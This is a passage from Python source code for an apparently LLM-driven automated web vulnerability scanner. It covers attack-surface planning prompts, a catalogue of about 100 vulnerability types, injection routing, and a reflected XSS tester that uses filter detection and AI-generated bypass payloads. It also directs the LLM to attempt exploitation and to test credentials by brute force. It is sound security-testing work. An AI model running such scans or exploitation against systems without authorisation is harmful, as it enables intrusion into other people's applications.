        # Map to our vuln type system
        mapped_type = self.VULN_TYPE_MAP.get(vuln_type, vuln_type)

        # Check for duplicates
        if self.memory.has_finding_for(mapped_type, endpoint, ""):
            return

        finding_hash = hashlib.md5(
            f"{mapped_type}{endpoint}".encode()
        ).hexdigest()[:8]

        finding = Finding(
            id=finding_hash,
            title=f"[{tool_name.upper()}] {title}",
            severity=severity,
            vulnerability_type=mapped_type,
            affected_endpoint=endpoint,
            evidence=evidence or f"Detected by {tool_name}",
            description=tool_finding.get("description", ""),
            remediation=tool_finding.get("remediation", ""),
            references=tool_finding.get("references", []),
            ai_verified=False,
            confidence="medium",
        )

        # Pull metadata from registry if available
        try:
            info = self.vuln_registry.get_vulnerability_info(mapped_type)
            if info:
                finding.cwe_id = finding.cwe_id or info.get("cwe_id", "")
                finding.cvss_score = finding.cvss_score or self._CVSS_SCORES.get(mapped_type, 0.0)
                finding.cvss_vector = finding.cvss_vector or self._CVSS_VECTORS.get(mapped_type, "")
        except Exception:
            pass

        # Generate PoC
        finding.poc_code = self.poc_generator.generate(
            mapped_type, endpoint, "", "", evidence
        )

        await self._add_finding(finding)
        self._stream_findings_count += 1

    async def _ai_analyze_attack_surface(self) -> Dict:
        """Use AI to analyze attack surface"""
        if not self.llm.is_available():
            return self._default_attack_plan()

        # Build detailed context for AI analysis
        endpoint_details = []
        for ep in self.recon.endpoints[:15]:
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys()) if parsed.query else []
            endpoint_details.append(f"  - [{method}] {parsed.path or '/'}" + (f" params: {params}" if params else ""))

        form_details = []
        for form in self.recon.forms[:10]:
            if isinstance(form, str):
                form_details.append(f"  - {form}")
                continue
            action = form.get('action', 'unknown') if isinstance(form, dict) else str(form)
            method = form.get('method', 'GET').upper() if isinstance(form, dict) else 'GET'
            inputs = form.get('inputs', []) if isinstance(form, dict) else []
            fields = []
            for f in inputs[:5]:
                if isinstance(f, str):
                    fields.append(f)
                elif isinstance(f, dict):
                    fields.append(f.get('name', 'unnamed'))
            form_details.append(f"  - [{method}] {action} fields: {fields}")

        context = f"""**Target Analysis Request**

Target: {self.target}
Scope: Web Application Security Assessment
User Instructions: {self.custom_prompt or DEFAULT_ASSESSMENT_PROMPT[:500]}

**Reconnaissance Summary:**

Technologies Detected: {', '.join(self.recon.technologies) if self.recon.technologies else 'Not yet identified'}

Endpoints Discovered ({len(self.recon.endpoints)} total):
{chr(10).join(endpoint_details) if endpoint_details else '  None yet'}

Forms Found ({len(self.recon.forms)} total):
{chr(10).join(form_details) if form_details else '  None yet'}

Parameters Identified: {list(self.recon.parameters.keys())[:15] if self.recon.parameters else 'None yet'}

API Endpoints: {self.recon.api_endpoints[:5] if self.recon.api_endpoints else 'None identified'}"""

        # Build available vuln types from knowledge base
        available_types = list(self.vuln_registry.VULNERABILITY_INFO.keys())
        kb_categories = self.knowledge_base.get("category_mappings", {})
        xbow_insights = self.knowledge_base.get("xbow_insights", {})

        # Execution history context (cross-scan learning)
        history_context = ""
        history_priority_str = ""
        if self.execution_history:
            try:
                history_context = self.execution_history.get_stats_for_prompt(
                    self.recon.technologies
                )
                history_priority = self.execution_history.get_priority_types(
                    self.recon.technologies, top_n=10
                )
                if history_priority:
                    history_priority_str = (
                        f"\n**Historically Effective Types for this tech stack:** "
                        f"{', '.join(history_priority[:10])}"
                    )
            except Exception:
                pass

        # Access control learning context (adaptive BOLA/BFLA/IDOR patterns)
        acl_context = ""
        if self.access_control_learner:
            try:
                domain = urlparse(self.target).netloc
                for acl_type in ["bola", "bfla", "idor", "privilege_escalation"]:
                    ctx = self.access_control_learner.get_learning_context(acl_type, domain)
                    if ctx:
                        acl_context += ctx + "\n"
            except Exception:
                pass

        # Knowledge augmentation from bug bounty patterns (opt-in via env)
        knowledge_context = ""
        if self.knowledge_augmentation_enabled:
            try:
                from core.knowledge_augmentor import KnowledgeAugmentor
                augmentor = KnowledgeAugmentor()
                for tech in self.recon.technologies[:3]:
                    patterns = augmentor.get_relevant_patterns(
                        vulnerability_type=tech, technologies=[tech]
                    )
                    if patterns:
                        knowledge_context += patterns[:500] + "\n"
            except Exception as e:
                logger.debug(f"Knowledge augmentation skipped: {e}")

        prompt = f"""Analyze this attack surface and create a prioritized, focused testing plan.

{context}

**Available Vulnerability Types (100 types from VulnEngine):**
{', '.join(available_types)}

**Vulnerability Categories:**
{json.dumps(kb_categories, indent=2)}

**XBOW Benchmark Insights:**
- Default credentials: Check admin panels with {xbow_insights.get('default_credentials', {}).get('common_creds', [])[:5]}
- Deserialization: Watch for {xbow_insights.get('deserialization', {}).get('frameworks', [])}
- Business logic: Test for {xbow_insights.get('business_logic', {}).get('patterns', [])}
- IDOR techniques: {xbow_insights.get('idor', {}).get('techniques', [])}
{f'''
**Historical Attack Success Rates (technology → vuln type: successes/total):**
{history_context}
{history_priority_str}''' if history_context else ''}
{f'''
**Bug Bounty Pattern Context:**
{knowledge_context[:800]}''' if knowledge_context else ''}
{f'''
**Access Control Learning (Adaptive BOLA/BFLA/IDOR Patterns):**
{acl_context[:800]}''' if acl_context else ''}

**Analysis Requirements:**

1. **Technology-Based Prioritization:**
   - If PHP detected → lfi, command_injection, ssti, sqli_error, file_upload, path_traversal
   - If ASP.NET/Java → xxe, insecure_deserialization, expression_language_injection, file_upload, sqli_error
   - If Node.js → nosql_injection, ssrf, prototype_pollution, ssti, command_injection
   - If Python/Django/Flask → ssti, command_injection, idor, mass_assignment
   - If API/REST → idor, bola, bfla, jwt_manipulation, auth_bypass, mass_assignment, rate_limit_bypass
   - If GraphQL → graphql_introspection, graphql_injection, graphql_dos
   - Always include: security_headers, cors_misconfig, clickjacking, ssl_issues

2. **High-Risk Endpoint Identification:**
   - Login/authentication endpoints
   - File upload/download functionality
   - Admin/management interfaces
   - API endpoints with user input
   - Search/query parameters

3. **Parameter Risk Assessment:**
   - Parameters named: id, user, file, path, url, redirect, callback
   - Hidden form fields
   - Parameters accepting complex input

4. **Attack Vector Suggestions:**
   - Specific payloads based on detected technologies
   - Chained attack scenarios
   - Business logic flaws to test

**IMPORTANT:** Use the exact vulnerability type names from the available types list above.

**Respond in JSON format:**
{{
    "priority_vulns": ["sqli_error", "xss_reflected", "idor", "lfi", "security_headers"],
    "high_risk_endpoints": ["/api/users", "/admin/upload"],
    "focus_parameters": ["id", "file", "redirect"],
    "attack_vectors": [
        "Test user ID parameter for IDOR",
        "Check file upload for unrestricted types",
        "Test search parameter for SQL injection"
    ],
    "technology_specific_tests": ["PHP: test include parameters", "Check for Laravel debug mode"]
}}"""

        try:
            # Governance: constrain the AI prompt to allowed vuln types
            if self.governance:
                prompt = self.governance.constrain_analysis_prompt(prompt)

            plan = await self.llm.generate_json(prompt,
                get_system_prompt("strategy"),
                task_type="attack_surface")
            if plan:
                # Governance: filter AI output at the data level
                if self.governance:
                    plan = self.governance.scope_attack_plan(plan)
                return plan
        except Exception as e:
            await self.log("debug", f"AI analysis error: {e}")

        return self._default_attack_plan()

    def _default_attack_plan(self) -> Dict:
        """Default attack plan with 5-tier coverage (100 vuln types)"""
        return {
            "priority_vulns": [
                # P1 - Critical: RCE, SQLi, auth bypass — immediate full compromise
                "sqli_error", "sqli_union", "command_injection", "ssti",
                "auth_bypass", "insecure_deserialization", "rfi", "file_upload",
                # P2 - High: data access, SSRF, privilege issues
                "xss_reflected", "xss_stored", "lfi", "ssrf", "ssrf_cloud",
                "xxe", "path_traversal", "idor", "bola",
                "sqli_blind", "sqli_time", "jwt_manipulation",
                "privilege_escalation", "arbitrary_file_read",
                # P3 - Medium: injection variants, logic, auth weaknesses
                "nosql_injection", "ldap_injection", "xpath_injection",
                "blind_xss", "xss_dom", "cors_misconfig", "csrf",
                "open_redirect", "session_fixation", "bfla",
                "mass_assignment", "race_condition", "host_header_injection",
                "http_smuggling", "subdomain_takeover",
                # P4 - Low: config, client-side, data exposure
                "security_headers", "clickjacking", "http_methods", "ssl_issues",
                "directory_listing", "debug_mode", "exposed_admin_panel",
                "exposed_api_docs", "insecure_cookie_flags",
                "sensitive_data_exposure", "information_disclosure",
                "api_key_exposure", "version_disclosure",
                "crlf_injection", "header_injection", "prototype_pollution",
                # P5 - Info/AI-driven: supply chain, crypto, cloud, niche
                "graphql_introspection", "graphql_dos", "graphql_injection",
                "cache_poisoning", "parameter_pollution", "type_juggling",
                "business_logic", "rate_limit_bypass", "timing_attack",
                "weak_encryption", "weak_hashing", "cleartext_transmission",
                "vulnerable_dependency", "s3_bucket_misconfiguration",
                "cloud_metadata_exposure", "soap_injection",
                "source_code_disclosure", "backup_file_exposure",
                "csv_injection", "html_injection", "log_injection",
                "email_injection", "expression_language_injection",
                "mutation_xss", "dom_clobbering", "postmessage_vulnerability",
                "websocket_hijacking", "css_injection", "tabnabbing",
                "default_credentials", "weak_password", "brute_force",
                "two_factor_bypass", "oauth_misconfiguration",
                "forced_browsing", "arbitrary_file_delete", "zip_slip",
                "orm_injection", "improper_error_handling",
                "weak_random", "insecure_cdn", "outdated_component",
                "container_escape", "serverless_misconfiguration",
                "rest_api_versioning", "api_rate_limiting",
                "excessive_data_exposure",
            ],
            "high_risk_endpoints": [_get_endpoint_url(e) for e in self.recon.endpoints[:10]],
            "focus_parameters": [],
            "attack_vectors": []
        }

    @staticmethod
    def _static_default_attack_plan() -> list:
        """Static version of _default_attack_plan for use by CTFCoordinator without an instance."""
        return [
            "sqli_error", "sqli_union", "command_injection", "ssti",
            "auth_bypass", "insecure_deserialization", "rfi", "file_upload",
            "xss_reflected", "xss_stored", "lfi", "ssrf", "ssrf_cloud",
            "xxe", "path_traversal", "idor", "bola",
            "sqli_blind", "sqli_time", "jwt_manipulation",
            "privilege_escalation", "arbitrary_file_read",
            "nosql_injection", "ldap_injection", "xpath_injection",
            "blind_xss", "xss_dom", "cors_misconfig", "csrf",
            "open_redirect", "session_fixation", "bfla",
            "mass_assignment", "race_condition", "host_header_injection",
            "http_smuggling", "subdomain_takeover",
            "security_headers", "clickjacking", "http_methods", "ssl_issues",
            "directory_listing", "debug_mode", "exposed_admin_panel",
            "exposed_api_docs", "insecure_cookie_flags",
            "sensitive_data_exposure", "information_disclosure",
            "api_key_exposure", "version_disclosure",
            "crlf_injection", "header_injection", "prototype_pollution",
            "graphql_introspection", "graphql_dos", "graphql_injection",
            "cache_poisoning", "parameter_pollution", "type_juggling",
            "business_logic", "rate_limit_bypass", "timing_attack",
            "weak_encryption", "weak_hashing", "cleartext_transmission",
            "vulnerable_dependency", "s3_bucket_misconfiguration",
            "cloud_metadata_exposure", "soap_injection",
            "source_code_disclosure", "backup_file_exposure",
            "csv_injection", "html_injection", "log_injection",
            "email_injection", "expression_language_injection",
            "mutation_xss", "dom_clobbering", "postmessage_vulnerability",
            "websocket_hijacking", "css_injection", "tabnabbing",
            "default_credentials", "weak_password", "brute_force",
            "two_factor_bypass", "oauth_misconfiguration",
            "forced_browsing", "arbitrary_file_delete", "zip_slip",
            "orm_injection", "improper_error_handling",
            "weak_random", "insecure_cdn", "outdated_component",
            "container_escape", "serverless_misconfiguration",
            "rest_api_versioning", "api_rate_limiting",
            "excessive_data_exposure",
        ]

    # Types that need parameter injection testing (payload → param → endpoint)
    INJECTION_TYPES = {
        # SQL injection
        "sqli_error", "sqli_union", "sqli_blind", "sqli_time",
        # XSS
        "xss_reflected", "xss_stored", "xss_dom", "blind_xss", "mutation_xss",
        # Command/template
        "command_injection", "ssti", "expression_language_injection",
        # NoSQL/LDAP/XPath/ORM
        "nosql_injection", "ldap_injection", "xpath_injection",
        "orm_injection", "graphql_injection",
        # File access
        "lfi", "rfi", "path_traversal", "xxe", "arbitrary_file_read",
        # SSRF/redirect
        "ssrf", "ssrf_cloud", "open_redirect",
        # Header/protocol injection
        "crlf_injection", "header_injection", "host_header_injection",
        "http_smuggling", "parameter_pollution",
        # Other injection-based
        "log_injection", "html_injection", "csv_injection",
        "email_injection", "prototype_pollution", "soap_injection",
        "type_juggling", "cache_poisoning",
    }

    # Types tested via header/response inspection (no payload injection needed)
    INSPECTION_TYPES = {
        "security_headers", "clickjacking", "http_methods", "ssl_issues",
        "cors_misconfig", "csrf",
        "directory_listing", "debug_mode", "exposed_admin_panel",
        "exposed_api_docs", "insecure_cookie_flags",
        "sensitive_data_exposure", "information_disclosure",
        "api_key_exposure", "version_disclosure",
        "cleartext_transmission", "weak_encryption", "weak_hashing",
        "source_code_disclosure", "backup_file_exposure",
        "graphql_introspection",
    }

    # Injection point routing: where to inject payloads for each vuln type
    # Types not listed here default to "parameter" injection
    VULN_INJECTION_POINTS = {
        # Header-based injection
        "crlf_injection": {"point": "header", "headers": ["X-Forwarded-For", "Referer", "User-Agent"]},
        "header_injection": {"point": "header", "headers": ["X-Forwarded-For", "Referer", "X-Custom-Header"]},
        "host_header_injection": {"point": "header", "headers": ["Host", "X-Forwarded-Host", "X-Host"]},
        "http_smuggling": {"point": "header", "headers": ["Transfer-Encoding", "Content-Length"]},
        # Path-based injection
        "path_traversal": {"point": "both", "path_prefix": True},
        "lfi": {"point": "both", "path_prefix": True},
        # Body-based injection (XML)
        "xxe": {"point": "body", "content_type": "application/xml"},
        # Parameter-based remains default for all other types
    }

    # Types requiring AI-driven analysis (no simple payload/inspection test)
    AI_DRIVEN_TYPES = {
        "auth_bypass", "jwt_manipulation", "session_fixation",
        "weak_password", "default_credentials", "brute_force",
        "two_factor_bypass", "oauth_misconfiguration",
        "idor", "bola", "bfla", "privilege_escalation",
        "mass_assignment", "forced_browsing",
        "race_condition", "business_logic", "rate_limit_bypass",
        "timing_attack", "insecure_deserialization",
        "file_upload", "arbitrary_file_delete", "zip_slip",
        "dom_clobbering", "postmessage_vulnerability",
        "websocket_hijacking", "css_injection", "tabnabbing",
        "subdomain_takeover", "cloud_metadata_exposure",
        "s3_bucket_misconfiguration", "serverless_misconfiguration",
        "container_escape", "vulnerable_dependency", "outdated_component",
        "insecure_cdn", "weak_random",
        "graphql_dos", "rest_api_versioning", "api_rate_limiting",
        "excessive_data_exposure", "improper_error_handling",
    }

    async def _test_all_vulnerabilities(self, plan: Dict):
        """Test for all vulnerability types (100-type coverage)"""
        vuln_types = plan.get("priority_vulns", list(self._default_attack_plan()["priority_vulns"]))

        # Governance: check if vulnerability testing is allowed in current phase
        if self.governance:
            _testing_decision = self.governance.check_action("_test_all_vulnerabilities")
            if not _testing_decision.allowed:
                await self.log("warning", f"[GOVERNANCE] Vulnerability testing blocked: {_testing_decision.reason}")
                return

        # Governance: defense-in-depth final filter — even if AI/plan slipped through
        if self.governance:
            vuln_types = self.governance.filter_vuln_types(vuln_types)

        # Pipeline focus: restrict to assigned vuln types if set by coordinator
        if self.focus_vuln_types:
            vuln_types = [v for v in vuln_types if v in self.focus_vuln_types]
            if not vuln_types:
                vuln_types = self.focus_vuln_types

        await self.log("info", f"  Testing {len(vuln_types)} vulnerability types")

        # Get testable endpoints
        test_targets = []
        seen_urls = set()

        # Add endpoints with parameters (extract params from URL if present)
        for endpoint in self.recon.endpoints[:50]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            if base_url in seen_urls:
                continue
            seen_urls.add(base_url)

            if parsed.query:
                params = list(parse_qs(parsed.query).keys())
                test_targets.append({
                    "url": base_url,
                    "method": "GET",
                    "params": params,
                    "original_url": url
                })
                await self.log("debug", f"  Found endpoint with params: {url[:60]}... params={params}")
            elif url in self.recon.parameters:
                test_targets.append({"url": url, "method": "GET", "params": self.recon.parameters[url]})
            elif base_url in self.recon.parameters:
                test_targets.append({"url": base_url, "method": "GET", "params": self.recon.parameters[base_url]})

        # Add REST API endpoints (JSON body params) — crucial for modern apps
        rest_common_params = ["id", "email", "username", "password", "query", "q", "search", "name", "role", "admin"]
        api_patterns = ("/api/", "/rest/", "/v1/", "/v2/", "/graphql")
        for endpoint in self.recon.endpoints[:80]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if base_url in seen_urls:
                continue
            path_lower = parsed.path.lower()
            if any(p in path_lower for p in api_patterns):
                seen_urls.add(base_url)
                test_targets.append({
                    "url": base_url,
                    "method": "POST",
                    "params": rest_common_params,
                    "is_rest_api": True
                })
                # Also test GET with query params
                test_targets.append({
                    "url": base_url,
                    "method": "GET",
                    "params": ["q", "id", "search", "type"],
                })

        # Add API endpoints discovered from JS analysis
        for api_ep in getattr(self.recon, 'api_endpoints', [])[:30]:
            api_url = api_ep if api_ep.startswith("http") else f"{self.target.rstrip('/')}/{api_ep.lstrip('/')}"
            parsed = urlparse(api_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if base_url in seen_urls:
                continue
            seen_urls.add(base_url)
            test_targets.append({
                "url": base_url,
                "method": "GET",
                "params": ["q", "id", "search", "type"],
            })

        # Add forms
        for form in self.recon.forms[:10]:
            form_url = form['action']
            if form_url not in seen_urls:
                seen_urls.add(form_url)
                test_targets.append({
                    "url": form_url,
                    "method": form['method'],
                    "params": form.get('inputs', [])
                })

        # If still few parameterized endpoints, add base endpoints with common params
        if len(test_targets) < 5:
            await self.log("warning", "  Few parameterized endpoints found, adding common params")
            for endpoint in self.recon.endpoints[:10]:
                url = _get_endpoint_url(endpoint)
                if url not in seen_urls:
                    seen_urls.add(url)
                    test_targets.append({
                        "url": url,
                        "method": "GET",
                        "params": ["id", "q", "search", "page", "file", "url", "cat", "artist", "item"]
                    })

        # Also test the main target with common params
        test_targets.append({
            "url": self.target,
            "method": "GET",
            "params": ["id", "q", "search", "page", "file", "url", "path", "redirect", "cat", "item"]
        })

        await self.log("info", f"  Total targets to test: {len(test_targets)}")

        # Route types into three categories
        injection_types = [v for v in vuln_types if v in self.INJECTION_TYPES]
        inspection_types = [v for v in vuln_types if v in self.INSPECTION_TYPES]
        ai_types = [v for v in vuln_types if v in self.AI_DRIVEN_TYPES]

        # ── Phase A: Inspection-based tests (fast, no payload injection) ──
        if inspection_types:
            await self.log("info", f"  Running {len(inspection_types)} inspection tests")

            # Security headers & clickjacking
            if any(t in inspection_types for t in ("security_headers", "clickjacking", "insecure_cookie_flags")):
                await self._test_security_headers("security_headers")

            # CORS
            if "cors_misconfig" in inspection_types:
                await self._test_cors()

            # Info disclosure / version / headers
            if any(t in inspection_types for t in (
                "http_methods", "information_disclosure", "version_disclosure",
                "sensitive_data_exposure",
            )):
                await self._test_information_disclosure()

            # Misconfigurations (directory listing, debug mode, admin panels, API docs)
            misconfig_types = {"directory_listing", "debug_mode", "exposed_admin_panel", "exposed_api_docs"}
            if misconfig_types & set(inspection_types):
                await self._test_misconfigurations()

            # Data exposure (source code, backups, API keys)
            data_types = {"source_code_disclosure", "backup_file_exposure", "api_key_exposure"}
            if data_types & set(inspection_types):
                await self._test_data_exposure()

            # SSL/TLS & crypto
            if any(t in inspection_types for t in ("ssl_issues", "cleartext_transmission", "weak_encryption", "weak_hashing")):
                await self._test_ssl_crypto()

            # GraphQL introspection
            if "graphql_introspection" in inspection_types:
                await self._test_graphql_introspection()

            # CSRF
            if "csrf" in inspection_types:
                await self._test_csrf_inspection()

        # ── Phase B0: Stored XSS - special two-phase form-based testing ──
        if "xss_stored" in injection_types:
            # If no forms found during recon, crawl discovered endpoints to find them
            if not self.recon.forms:
                await self.log("info", "  [STORED XSS] No forms in recon - crawling endpoints to discover forms...")
                for ep in self.recon.endpoints[:15]:
                    ep_url = _get_endpoint_url(ep)
                    if ep_url:
                        await self._crawl_page(ep_url)
                if self.recon.forms:
                    await self.log("info", f"  [STORED XSS] Discovered {len(self.recon.forms)} forms from endpoint crawl")

        if "xss_stored" in injection_types and self.recon.forms:
            await self.log("info", f"  [STORED XSS] Two-phase testing against {len(self.recon.forms)} forms")
            for form in self.recon.forms[:10]:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return
                finding = await self._test_stored_xss(form)
                if finding:
                    await self._add_finding(finding)
            # Remove xss_stored from generic injection loop (already tested via forms)
            injection_types = [v for v in injection_types if v != "xss_stored"]

        # ── Phase B0.3: Form-based authentication testing ──
        auth_form_types = {"default_credentials", "weak_password", "auth_bypass", "brute_force"}
        if auth_form_types & set(ai_types) and self.recon.forms:
            await self.log("info", "  [FORM AUTH] Testing login forms for auth vulnerabilities")
            auth_findings = await self._test_form_auth()
            for finding in auth_findings:
                await self._add_finding(finding)
            # Remove tested auth types from ai_types so they don't fall through
            # to the generic _ai_dynamic_test()
            ai_types = [v for v in ai_types if v not in auth_form_types]

        # ── Phase B0.5: Reflected XSS - dedicated context-aware testing ──
        if "xss_reflected" in injection_types:
            await self.log("info", f"  [REFLECTED XSS] Context-aware testing against {len(test_targets)} targets")
            for target in test_targets:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return
                t_url = target.get('url', '')
                t_params = target.get('params', [])
                t_method = target.get('method', 'GET')
                finding = await self._test_reflected_xss(t_url, t_params, t_method)
                if finding:
                    await self._add_finding(finding)
            injection_types = [v for v in injection_types if v != "xss_reflected"]

        # ── Phase B: Injection-based tests against parameterized endpoints ──
        if injection_types:
            await self.log("info", f"  Running {len(injection_types)} injection tests against {len(test_targets)} targets")
            for target in test_targets:
                await self._wait_if_paused()
                if self.is_cancelled():
                    await self.log("warning", "Scan cancelled by user")
                    return

                url = target.get('url', '')

                # Strategy: skip dead endpoints
                if self.strategy and not self.strategy.should_test_endpoint(url):
                    await self.log("debug", f"  [STRATEGY] Skipping dead endpoint: {url[:60]}")
                    continue

                await self.log("info", f"  Testing: {url[:60]}...")

                for vuln_type in injection_types:
                    await self._wait_if_paused()
                    if self.is_cancelled():
                        return

                    # Strategy: skip vuln types with diminishing returns on this endpoint
                    if self.strategy and not self.strategy.should_test_type(vuln_type, url):
                        continue

                    # Strategy: pivot away from low-confidence vuln types
                    if self.strategy:
                        should_pivot, pivot_reason = self.strategy.should_pivot_approach(vuln_type)
                        if should_pivot:
                            logger.debug(f"Pivoting away from {vuln_type}: {pivot_reason}")
                            continue

                    finding = await self._test_vulnerability_type(
                        url,
                        vuln_type,
                        target.get('method', 'GET'),
                        target.get('params', [])
                    )
                    if finding:
                        await self._add_finding(finding)
                        # Strategy: record success
                        if self.strategy:
                            self.strategy.record_test_result(url, vuln_type, 200, True, 0)
                    elif self.strategy:
                        self.strategy.record_test_result(url, vuln_type, 0, False, 0)

                # Strategy: recompute priorities periodically
                if self.strategy and self.strategy.should_recompute_priorities():
                    injection_types = self.strategy.recompute_priorities(injection_types)

        # ── Phase B+: AI-suggested additional tests ──
        if self.llm.is_available() and self.memory.confirmed_findings:
            findings_summary = "\n".join(
                f"- {f.title} ({f.severity}) at {f.affected_endpoint}"
                for f in self.memory.confirmed_findings[:20]
            )
            target_urls = [t.get('url', '') for t in test_targets[:5]]
            suggested = await self._ai_suggest_next_tests(findings_summary, target_urls)
            if suggested:
                await self.log("info", f"  [AI] Suggested additional tests: {', '.join(suggested)}")
                for vt in suggested[:5]:
                    if vt in injection_types or vt in inspection_types:
                        continue  # Already tested
                    await self._wait_if_paused()
                    if self.is_cancelled():
                        return
                    for target in test_targets[:3]:
                        finding = await self._test_vulnerability_type(
                            target.get('url', ''), vt,
                            target.get('method', 'GET'),
                            target.get('params', [])
                        )
                        if finding:
                            await self._add_finding(finding)

        # ── Phase C: AI-driven tests (require LLM for intelligent analysis) ──
        if ai_types and self.llm.is_available():
            # Prioritize: test top 10 AI-driven types
            ai_priority = ai_types[:10]
            await self.log("info", f"  AI-driven testing for {len(ai_priority)} types: {', '.join(ai_priority[:5])}...")
            for vt in ai_priority:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return
                await self._ai_dynamic_test(
                    f"Test the target {self.target} for {vt} vulnerability. "
                    f"Analyze the application behavior, attempt exploitation, and report only confirmed findings."
                )

        # ── Test Phase Summary ──
        if self.strategy:
            report = self.strategy.get_report_context()
            tested_types = report.get("top_vuln_types", [])
            await self.log("info",
                f"[TEST SUMMARY] {report.get('total_tests', 0)} tests across "
                f"{report.get('endpoints_tested', 0)} endpoints, "
                f"{report.get('total_findings', 0)} findings")
            for vt_info in tested_types:
                await self.log("info",
                    f"  {vt_info['type']}: {vt_info['tests']} tests, "
                    f"{vt_info['confirmed']} confirmed ({vt_info['rate']})")
        else:
            confirmed = len(self.memory.confirmed_findings) if self.memory else 0
            await self.log("info",
                f"[TEST SUMMARY] {confirmed} confirmed findings from "
                f"{len(test_targets)} targets")

    async def _test_reflected_xss(
        self, url: str, params: List[str], method: str = "GET"
    ) -> Optional[Finding]:
        """Dedicated reflected XSS testing with filter detection + context analysis + AI.

        1. Canary probe each param to find reflection points
        2. Enhanced context detection at each reflection
        3. Filter detection to map what's blocked
        4. Build payload list: AI-generated + escalation + context payloads
        5. Test with per-payload dedup
        """
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query) if parsed.query else {}
        test_params = params if params else list(existing_params.keys())
        if not test_params:
            test_params = ["id", "q", "search", "page", "file", "url"]

        for param in test_params[:8]:
            if self.memory.was_tested(base_url, param, "xss_reflected"):
                continue

            # Step 1: Canary probe to find reflection
            canary = f"nsxss{hashlib.md5(f'{base_url}{param}'.encode()).hexdigest()[:6]}"
            test_data = {param: canary}
            for k, v in existing_params.items():
                if k != param:
                    test_data[k] = v[0] if isinstance(v, list) else v

            canary_resp = await self._make_request(base_url, method, test_data)
            if not canary_resp or canary not in canary_resp.get("body", ""):
                self.memory.record_test(base_url, param, "xss_reflected", [canary], False)
                continue

            await self.log("info", f"    [{param}] Canary reflected! Analyzing context...")

            # Step 2: Enhanced context detection
            context_info = self._detect_xss_context_enhanced(canary_resp["body"], canary)
            context = context_info["context"]
            await self.log("info", f"    [{param}] Context: {context} "
                          f"(tag={context_info.get('enclosing_tag', '')}, "
                          f"attr={context_info.get('attribute_name', '')})")

            # Step 3: Filter detection
            filter_map = await self._detect_xss_filters(base_url, param, method)

            # Step 4: Build payload list
            context_payloads = self.payload_generator.get_context_payloads(context)
            escalation = self._escalation_payloads(filter_map, context)
            bypass_payloads = self.payload_generator.get_filter_bypass_payloads(filter_map)

            challenge_hint = self.lab_context.get("challenge_name", "") or ""
            if self.lab_context.get("notes"):
                challenge_hint += f" | {self.lab_context['notes']}"
            ai_payloads = await self._ai_generate_xss_payloads(
                filter_map, context_info, challenge_hint
            )

            # Merge and deduplicate
            seen: set = set()
            payloads: List[str] = []
            for p in (ai_payloads + escalation + bypass_payloads + context_payloads):
                if p not in seen:
                    seen.add(p)
                    payloads.append(p)

            if not payloads:
                payloads = self._get_payloads("xss_reflected")

            await self.log("info", f"    [{param}] Testing {len(payloads)} payloads "
                          f"(AI={len(ai_payloads)}, esc={len(escalation)}, ctx={len(context_payloads)})")

            # Step 5: Test payloads
            tester = self.vuln_registry.get_tester("xss_reflected")
            baseline_resp = self.memory.get_baseline(base_url)
            if not baseline_resp:
                baseline_resp = await self._make_request(base_url, method, {param: "safe123test"})
                if baseline_resp:
                    self.memory.store_baseline(base_url, baseline_resp)

            for i, payload in enumerate(payloads[:30]):
                await self._wait_if_paused()
                if self.is_cancelled():
                    return None

                payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
                dedup_param = f"{param}|{payload_hash}"
                if self.memory.was_tested(base_url, dedup_param, "xss_reflected"):
                    continue

                test_data = {param: payload}
                for k, v in existing_params.items():
                    if k != param:
                        test_data[k] = v[0] if isinstance(v, list) else v

                test_resp = await self._make_request(base_url, method, test_data)
                if not test_resp:
                    self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], False)
                    continue

                # Check with tester
                detected, confidence, evidence = tester.analyze_response(
                    payload, test_resp.get("status", 0),
                    test_resp.get("headers", {}),
                    test_resp.get("body", ""), {}
                )

                if detected and confidence >= 0.7:
                    await self.log("warning", f"    [{param}] [XSS REFLECTED] Phase tester confirmed "
                                  f"(conf={confidence:.2f}): {evidence[:60]}")

                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        "xss_reflected", url, param, payload, evidence, test_resp
                    )
                    if finding:
                        await self.log("warning", f"    [{param}] [XSS REFLECTED] CONFIRMED: {payload[:50]}")
                        self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], True)
                        return finding

                self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], False)

        return None

    async def _test_vulnerability_type(self, url: str, vuln_type: str,
                                        method: str = "GET", params: List[str] = None) -> Optional[Finding]:
        """Test for a specific vulnerability type with correct injection routing."""
        if self.is_cancelled():
            return None

        payloads = self._get_payloads(vuln_type)

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Check injection routing table for this vuln type
        injection_config = self.VULN_INJECTION_POINTS.get(vuln_type, {"point": "parameter"})
        injection_point = injection_config["point"]

        # ── Header-based injection (CRLF, host header, etc.) ──
        if injection_point == "header":
            header_names = injection_config.get("headers", ["X-Forwarded-For"])
            return await self._test_header_injection(
                base_url, vuln_type, payloads, header_names, method
            )

        # ── Body-based injection (XXE) ──
        if injection_point == "body":
            return await self._test_body_injection(
                base_url, vuln_type, payloads, method
            )

        # ── Both parameter AND path injection (LFI, path traversal) ──
        if injection_point == "both":
            existing_params = parse_qs(parsed.query) if parsed.query else {}
            test_params = params or list(existing_params.keys()) or ["file", "path", "page", "include", "id"]
            # Try parameter injection first
            result = await self._test_param_injection(
                base_url, url, vuln_type, payloads, test_params, existing_params, method
            )
            if result:
                return result
            # Then try path-based injection
            return await self._test_path_injection(base_url, vuln_type, payloads, method)

        # ── Default: Parameter-based injection ──
        existing_params = parse_qs(parsed.query) if parsed.query else {}
